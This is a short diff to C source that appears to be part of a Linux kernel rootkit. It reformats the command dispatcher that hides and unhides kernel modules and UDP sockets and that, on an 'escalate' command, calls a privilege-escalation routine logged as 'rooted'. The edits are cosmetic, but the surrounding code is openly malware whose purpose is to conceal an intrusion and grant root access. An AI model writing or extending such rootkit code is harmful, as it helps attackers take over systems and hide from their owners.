@@ -15,7 +15,7 @@ static char command_buffer[32];
 static int command_counter = 0;
 
 static char param_buffer[1024];
-static int param_counter;
+static int param_counter = 0;
 
 void
 execute_command (void)
@@ -86,19 +86,21 @@ execute_command (void)
 			port = convert_atoi(param_buffer);
 			unhide_udp_socket(port);
 		}
-	} else if(strcmp(command_buffer, "hide_module") == 0) {
-                if(param_counter > 0) {
-                        hide_module_byname(param_buffer);
-                }
-
-        } else if(strcmp(command_buffer, "unhide_module") == 0) {
-                if(param_counter > 0) {
-                        unhide_module_byname(param_buffer);
-                }	
 		
+	} else if(strcmp(command_buffer, "hide_module") == 0) {
+		if(param_counter > 0) {
+			hide_module_byname(param_buffer);
+		}
+
+	} else if(strcmp(command_buffer, "unhide_module") == 0) {
+		if(param_counter > 0) {
+			unhide_module_byname(param_buffer);
+		}	
+
 	} else if(strcmp(command_buffer, "escalate") == 0) {
 		priv_escalation();
 		ROOTKIT_DEBUG("rooted\n");
+		
 	}
 
 	/* cleanup */
